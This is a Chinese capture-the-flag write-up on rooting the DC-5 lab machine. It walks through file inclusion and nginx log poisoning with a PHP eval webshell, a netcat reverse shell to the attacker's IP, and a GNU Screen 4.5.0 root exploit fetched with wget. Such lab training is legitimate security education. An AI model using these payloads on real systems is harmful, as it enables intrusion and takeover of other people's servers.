---
title: 靶机练习-DC-5
url: https://mp.weixin.qq.com/s?__biz=MzI0NzEwOTM0MA==&mid=2652500095&idx=1&sn=92842ca9a5cf5d33173dc8b4d8b3c6c2&chksm=f25853ccc52fdadaf00d02a91568e905f01aca2aaeeb49fa770fc8a9995bfed05b8370e620c8&scene=58&subscene=0#rd
source: 雷神众测
date: 2022-10-15
fetch_date: 2025-10-03T19:57:30.658139
---

# 靶机练习-DC-5

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/HxO8NorP4JVtS5Z8947GibsAt4vrt7cbficWnyFIz5gjaC632n2Hz1DA735eN28jhsct7HmCeAVv1VCeK4NRtU3g/0?wx_fmt=jpeg)

# 靶机练习-DC-5

原创

Yanqian

雷神众测

![](https://mmbiz.qpic.cn/mmbiz_svg/ofvnGicEPbfSzSpQGue94NepYQBSUxAIeBIkoWRdbYuKL96u6fvnL4GXJnSzsMC9z3GPPcJlj7cv2UoPqXvJgKrpFXxjPdCCp/640?wx_fmt=svg)

**STATEMENT**

**声明**

由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，雷神众测及文章作者不为此承担任何责任。

雷神众测拥有对此文章的修改和解释权。如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经雷神众测允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的。

![](https://mmbiz.qpic.cn/mmbiz_svg/ofvnGicEPbfSzSpQGue94NepYQBSUxAIeBIkoWRdbYuKL96u6fvnL4GXJnSzsMC9z3GPPcJlj7cv2UoPqXvJgKrpFXxjPdCCp/640?wx_fmt=svg)

环境

Vulhub DC-5靶机，vmware环境，kali虚拟机一台（ip为192.168.8.245）

![](https://mmbiz.qpic.cn/mmbiz_svg/ofvnGicEPbfSzSpQGue94NepYQBSUxAIeBIkoWRdbYuKL96u6fvnL4GXJnSzsMC9z3GPPcJlj7cv2UoPqXvJgKrpFXxjPdCCp/640?wx_fmt=svg)

复现过程

攻击机：kali 192.168.11.143
靶机：Linux IP自动获取
攻击机与靶机都使用net网络连接，在同一网段下

**环境配置：**

1、Vulhub下载靶机，并导入vmware

2、网络配置中选择更改为桥接模式，桥接至kali所在网卡（这里是eth0）

3、重启虚拟机

**信息收集：**

先进行主机发现

```
arp-scan -l
```

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVtS5Z8947GibsAt4vrt7cbfaskbK5ojicsEK03p1gCgUePBuFWuFcxslFk8dYSjBY7MlvpJ1ME9licg/640?wx_fmt=png)

后面标识VMware的即为目标

先进行nmap端口扫描

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVtS5Z8947GibsAt4vrt7cbfse0ic8zkeic1picpYk95vZw76Hacbrz8z8iaMicbX6hzicP7S7UQmUh16LJg/640?wx_fmt=png)

80，111端口服务开启

先访问 http://192.168.8.243

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVtS5Z8947GibsAt4vrt7cbf42KCwuhVE1OibIWlJP1zftiaIINmqLsic3XVnr8UicByRfg8HEaQYPNQmg/640?wx_fmt=png)

界面的信息略过，发现在contact.php界面有留言功能

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVtS5Z8947GibsAt4vrt7cbfwUAPT3dTnrKH7bqTshyDdqYEERAMwrwBDhiclG9gAuYYezMTHb861hg/640?wx_fmt=png)

先尝试下xss注入，没什么结果

```
<scRipt>alert('Xss')</scriPt>
```

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVtS5Z8947GibsAt4vrt7cbf7bxfhjnXicdLOjAh8QXBKZZTIjeq2aExcX3QhdDyJnSHhvYSooSWkJg/640?wx_fmt=png)

在尝试这几个聊天框的时候发现CopyRight的年份一直在变化。F5刷新几次，仍在刷新说明和上传了留言无关，是其中的copyright自己在变化。

返回路径contactus，多次刷新，copyright并没有发生变化。

说明问题出在thankyou.php中。

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVtS5Z8947GibsAt4vrt7cbff6y3RxSor0n0ep4icjPfNCDyHmCARKv914TYa2CpWJC46LOIYxy6c6A/640?wx_fmt=png)

dirsearch扫一下目录

```
dirsearch -u [http://192.168.8.243](http://192.168.8.243)
```

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVtS5Z8947GibsAt4vrt7cbfkWNIib2fLg2zOG8edKgFIGpoZIlBKUh1oMaNYMkkjN424ZicsAgm0BOg/640?wx_fmt=png)

/images路径 403，只有footer.php可以访问。

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVtS5Z8947GibsAt4vrt7cbfbK8zdo7icRqbZfvM8DCD79u53KRx5qVXtvH8FCj83FoMib82SYiafSvvw/640?wx_fmt=png)

同时刷新会产生变化，这一点与前面提交留言后，弹出的/thankyou.php路径下的CopyRight一直变化是一致的。

可以猜测是页面/thankyou.php 中存在文件包含，包含了页面footer.php.

![](https://mmbiz.qpic.cn/mmbiz_svg/ofvnGicEPbfSzSpQGue94NepYQBSUxAIeBIkoWRdbYuKL96u6fvnL4GXJnSzsMC9z3GPPcJlj7cv2UoPqXvJgKrpFXxjPdCCp/640?wx_fmt=svg)

漏洞利用

先尝试 payload file=/etc/passwd

既然可以读取密码文件，那也可以读取日志文件，方便我们读取木马

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVtS5Z8947GibsAt4vrt7cbfghGR9IH8zc3BkTohQSnAbsdic2eibG9ZeuMsg4WsS3uoEMOhtgNLpBNQ/640?wx_fmt=png)

footer.php界面出现了passwd数据，证明这里存在文件上传漏洞

但目前没有找到login界面，先上传一句话木马

```
<?php @eval($_POST['shell']);?>
```

返回200，注入已经成功了，但目前我们不知道其路径，还不能利用

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVtS5Z8947GibsAt4vrt7cbfyTQqEJh8n3oG3fuJruxyR4SibdU38apmZohsZUsWHtWmDpFsxcY9Qsg/640?wx_fmt=png)

这里可以利用系统工作日志

从之前nmap上获得了目标的中间件信息，网上搜到该版本的日志路径

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVtS5Z8947GibsAt4vrt7cbfInj3fQpueMwZn4lQljHzgbe4PUDyPT1RJxpktQJP1BgROcTC7ic32xQ/640?wx_fmt=png)

```
/var/log/nginx/access.log
```

传入日志，发现之前的注入记录，包含木马在内都显示了出来

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVtS5Z8947GibsAt4vrt7cbf8eliaQLRxmhPPbC1t3PC1rA6VNVRJkq7eYhNXsoXtmxtZFwgVaFZrvg/640?wx_fmt=png)

phpinfo()界面

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVtS5Z8947GibsAt4vrt7cbfiaH4ZopkQwrp85JHAqh8tLbRwSiapMxFO8V2cXgfkwanoZW2grW2iaNmg/640?wx_fmt=png)

蚁剑连接木马

URL为：

http://192.168.8.243/thankyou.php?file=/var/log/nginx/access.log

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVtS5Z8947GibsAt4vrt7cbfeBibATNKNdhBreG6CB2flaoQoWFicSUqpu9eMaWj0Wx2TPlWa2owYCibQ/640?wx_fmt=png)

连接一句话木马，获得 www-data权限

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVtS5Z8947GibsAt4vrt7cbf6fmfTWY0KyYeGm9GaYcdHNLdQWUOssB8cCsY9mwwXRl3ib85icoibgBiaw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_svg/ofvnGicEPbfSzSpQGue94NepYQBSUxAIeBIkoWRdbYuKL96u6fvnL4GXJnSzsMC9z3GPPcJlj7cv2UoPqXvJgKrpFXxjPdCCp/640?wx_fmt=svg)

提权

拿到普通用户就要开始想办法提权了

反弹shell

kali的IP为 192.168.8.245

1、在kali中开启监听

```
nv -lvvp 8888
```

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVtS5Z8947GibsAt4vrt7cbfbOBYKib2ydfcT9pKBOGHCMan0bno5P5oic6rYDU0Hqe7C7R4fHVArDtg/640?wx_fmt=png)

2、在webshell中 开启反向连接

```
nc -e /bin/bash 192.168.8.245 8888
```

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVtS5Z8947GibsAt4vrt7cbf6zIxmGTbt1qadVpcYO51LKrwqUqyeTiaVm1ILdvl5q8x24RnMBPdqLQ/640?wx_fmt=png)

3、连接成功，由此建立了kali至目标主机的长期连接

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVtS5Z8947GibsAt4vrt7cbfibTh3IMuytbCmo0IZOvicuzk0XmHSFhr1eytGF4ibbLGv3vEV7PNmNzJQ/640?wx_fmt=png)

4、查找suid权限用户，尝试提权

```
find / -perm -4000 2>/dev/null
```

查找系统所有文件中拥有suid特殊权限的文件 -perm匹配权限4000.

错误信息返回至 /dev/null

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVtS5Z8947GibsAt4vrt7cbfia2ljriayOLgntWsY3IDMiaicp2ib68jMRychwiaPwNpvZ9zz0DTYic3wJudg/640?wx_fmt=png)

5、在kali中另起控制台，寻找能利用的点

```
searchsploit xxx
```

6、尝试过后，screen 4.5.0有能够利用的exp，是一个本地提权漏洞

```
searchsploit screen 4.5.0
```

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVtS5Z8947GibsAt4vrt7cbfLpDlLGaFvsaFtDCYwg3W6W7KCIAE4PZygFdbku9Izbs1M608QDnthQ/640?wx_fmt=png)

GNU Screen是一款由GNU计划开发的用于命令行终端切换的自由软件。用户可以通过该软件同时连接多个本地或远程的命令行会话，并在其间自由切换。GNU Screen可以看作是窗口管理器的命令行界面版本。它提供了统一的管理多个会话的界面和相应的功能。

7、上传脚本文件

上传41154.sh脚本文件到目标靶机；本地开启8888端口，使用wget下载该脚本文件：

Kali

```
cp /usr/share/exploitdb/exploits/linux/local/41154.sh ./41154.sh
```

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVtS5Z8947GibsAt4vrt7cbfibz7RNrk9tH5ibqpViaFDc0uS3wcdTKePU3gL5V8ia56GRZkFeib5hOmIJg/640?wx_fmt=png)

```
cat 41154.sh# 在哪个目录运行该命令，就会列出哪个目录的文件
```

```
python -m http.server 8888
```

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVtS5Z8947GibsAt4vrt7cbf76tzIGqWKEBPxzQ8bA6CicU9ibJIIDqHV0M0EdDLRTyxy9tjdTGR0MBw/640?wx_fmt=png)

目标主机

```
wget [http://192.168.8.245/41154.sh](http://192.168.8.245/41154.sh)
```

使用蚁剑wget

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVtS5Z8947GibsAt4vrt7cbfhZAx9h8EXG4fib4tVpIrWqwVWrK3XUKzWn9MUFmomiahiakU7ziaCpvKpg/640?wx_fmt=png)

8、执行脚本文件

```
chmod 777 41154.sh
./41154.sh
```

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVtS5Z8947GibsAt4vrt7cbfPoGMRrCIoTdkAGtmVy67lNKMvzxOZB79BTCR76hhS3UEEYowN8Dxiaw/640?wx_fmt=png)

文件编译错误

9、报错，经查验 是这个exp文件有问题，按照区块的EOF提示符拆分脚本。

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVtS5Z8947GibsAt4vrt7cbfyyDiaprCSzpnWpQLQZ6KzmkHzibKqia8go7micB2kVeD6N9lH6rxsct52g/640?wx_fmt=png)

(1)vi libhax.c

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVtS5Z8947GibsAt4vrt7cbfXLtKJ36jsvXtXyuuaqG7ZTnqDFrpgYuFO3VSRvZ59vrAoy3AiabicQ2Q/640?wx_fmt=png)

(2)vi rootshell.c

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVtS5Z8947GibsAt4vrt7cbfCMJRD35jyHCG4yXZAU8d0rDw8mQqvVaUF8LibjQo0LmQCy68ExfIH6A/640?wx_fmt=png)

(3)vi run.sh

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVtS5Z8947GibsAt4vrt7cbfw16Via3IAOpYK9eXlWFkw6P1P2pNNjkeSZRrQbR7aWdBCXV2QJBLl1Q/640?wx_fmt=png)

编译文件

gcc -fPIC -shared -ldl -o libhax.so libhax.c

gcc -o rootshell rootshell.c

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVtS5Z8947GibsAt4vrt7cbfslKNZib0FGzBoAma9JVOlHTyJ8VeF9Wj653HdzgFs23BmCCHZIu2ohA/640?wx_fmt=png)

10.重新上传

通过wget上传三个文件

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVtS5Z8947GibsAt4vrt7cbfUsrtsWvJnQLyhL1XDpcymQ6zdZ5NSn3UWlcWme1fkZGEZ1E1oGm85Q/640?wx_fmt=png)

11、为run.sh赋予权限并运行，获得root权限

```
chmod 777 run.sh
./run.sh
whoami
```

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVtS5Z8947GibsAt4vrt7cbf2JCne4QgARWRABTy9TkFicTVaTx2buLU98T5IlYicyjysX0kqCXCYALg/640?wx_fmt=png)

12、root目录下取得flag

```
cd /root
ls
```

![](https...